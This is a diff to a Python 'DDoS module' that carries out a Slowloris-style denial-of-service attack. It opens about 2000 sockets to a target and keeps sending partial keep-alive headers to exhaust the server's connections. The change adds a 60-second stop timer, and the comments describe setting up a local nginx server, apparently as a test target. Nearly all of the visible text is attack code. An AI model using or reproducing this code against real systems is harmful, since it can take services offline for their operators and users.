@@ -41,6 +41,7 @@ def init_socket(ip, port):
 ###########################################################################################################################
 
 def main(ip, port):
+    start_time = time.time()
     #ip = sys.argv[1]
     ip = ip
     socket_count = 2000
@@ -56,7 +57,12 @@ def main(ip, port):
         list_of_sockets.append(s)
 
     while True:
-        #log("Sending keep-alive headers...Socket count: {}".format(list_of_sockets))
+        end_time = time.time()
+        elapsed_time = end_time - start_time
+        if (elapsed_time > 60): 
+            print("STOP ATTACK!")
+            break
+
         for s in list(list_of_sockets):
             try:
                 s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
@@ -73,12 +79,16 @@ def main(ip, port):
                 break
         time.sleep(5)
 
+    return 0
+
 # Install the server: sudo apt install nginx
 # Start the server (localhost:80): sudo systemctl start nginx.service
 # Check the status of the server: systemctl status nginx.service
 
 def run(ip, port):
     print("[+] DDoS module activated...")
+
+    start_time = time.time()
     
     thread = threading.Thread(target=main, args=(ip, port), daemon=True)
     thread.start()
